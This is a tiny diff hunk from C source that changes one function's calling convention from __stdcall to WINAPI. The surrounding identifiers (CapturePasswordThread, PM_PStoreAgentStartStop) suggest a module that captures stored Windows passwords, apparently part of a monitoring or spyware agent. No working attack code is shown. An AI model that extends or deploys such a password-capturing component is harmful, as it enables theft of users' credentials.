@@ -136,7 +136,7 @@ DWORD WINAPI CapturePasswordThread(DWORD dummy)
 	}
 }
 
-DWORD __stdcall PM_PStoreAgentStartStop(BOOL bStartFlag, BOOL bReset)
+DWORD WINAPI PM_PStoreAgentStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	DWORD dummy;
 	if (bPM_PasswordStarted == bStartFlag)
